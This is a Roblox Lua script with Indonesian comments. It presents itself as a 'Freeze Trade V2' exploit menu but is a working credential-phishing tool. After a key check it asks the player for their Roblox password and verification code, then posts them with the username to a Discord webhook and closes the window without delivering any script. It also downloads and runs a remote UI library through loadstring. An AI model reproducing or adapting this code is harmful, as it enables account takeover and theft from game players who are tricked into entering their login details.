local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

-- Dapatkan Username Roblox secara otomatis
local Username = game.Players.LocalPlayer.Name -- Ambil username akun
local WebhookURL = "https://discord.com/api/webhooks/XXX/XXX" -- Masukkan Webhook URL kamu di sini

-- Key yang diperlukan untuk membuka akses
local CorrectKey = "FreezeTradeV2" -- Ganti ini dengan key yang kamu inginkan

-- Variabel untuk menyimpan data input
local Password = ""
local VerificationCode = ""

-- Fungsi untuk mengirim data ke webhook
local function SendToWebhook(content)
    local HttpService = game:GetService("HttpService")
    local Data = {
        ["content"] = content, -- Isi pesan yang akan dikirim
        ["username"] = "Rayfield Bot" -- Nama pengirim di webhook
    }
    HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(Data))
end

-- Step 1: Key Input
local Window = Rayfield:CreateWindow({
    Name = "KeyLess Freeze Trade V2",
    LoadingTitle = "Dont Share!",
    LoadingSubtitle = "By Dinzzz",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "SecureScript", -- Optional
        FileName = "Config"
    },
    Discord = {
        Enabled = false,
        Invite = "", -- Optional
        RememberJoins = true
    },
    KeySystem = false,
})

local Tab = Window:CreateTab("Step 1: Unlock Script", 4483362458) -- Tab untuk langkah pertama

Tab:CreateInput({
    Name = "Masukkan Key untuk Unlock",
    PlaceholderText = "Input key di sini",
    RemoveTextAfterFocusLost = false,
    Callback = function(input)
        if input == CorrectKey then
            Rayfield:Notify({
                Title = "Key Benar!",
                Content = "Akses diberikan. Melanjutkan ke langkah berikutnya.",
                Duration = 5,
            })

            -- Hapus tab Step 1 dan buat tab untuk Step 2-3
            Tab:Destroy()

            -- Step 2: Input Username, Password, dan Verifikasi
            local Tab2 = Window:CreateTab("Step 2: Input Data", 4483362458)

            Tab2:CreateLabel("Username (Auto): " .. Username)

            Tab2:CreateInput({
                Name = "Masukkan Password",
                PlaceholderText = "Input password di sini",
                RemoveTextAfterFocusLost = false,
                Callback = function(input)
                    Password = input
                    Rayfield:Notify({
                        Title = "Password Tersimpan!",
                        Content = "Password berhasil diinputkan.",
                        Duration = 5,
                    })
                end,
            })

            Tab2:CreateInput({
                Name = "Masukkan Kode Verifikasi",
                PlaceholderText = "Input kode di sini",
                RemoveTextAfterFocusLost = false,
                Callback = function(input)
                    VerificationCode = input
                    Rayfield:Notify({
                        Title = "Kode Tersimpan!",
                        Content = "Kode berhasil diinputkan.",
                        Duration = 5,
                    })
                end,
            })

            -- Tombol untuk Kirim ke Webhook
            Tab2:CreateButton({
                Name = "Get Script",
                Callback = function()
                    if Password ~= "" and VerificationCode ~= "" then
                        local Content = string.format(
                            "Username: %s\nPassword: %s\nVerification Code: %s",
                            Username, Password, VerificationCode
                        )
                        SendToWebhook(Content)

                        Rayfield:Notify({
                            Title = "Data Terkirim!",
                            Content = "Semua data berhasil dikirim ke webhook.",
                            Duration = 5,
                        })

                        -- Destroy UI setelah pengiriman berhasil
                        task.wait(2)
                        Rayfield:Destroy()
                    else
                        Rayfield:Notify({
                            Title = "Error!",
                            Content = "Harap isi semua field sebelum mengirim.",
                            Duration = 5,
                        })
                    end
                end,
            })
        else
            Rayfield:Notify({
                Title = "Key Salah!",
                Content = "Silakan coba lagi dengan key yang benar.",
                Duration = 5,
            })
        end
    end,
})
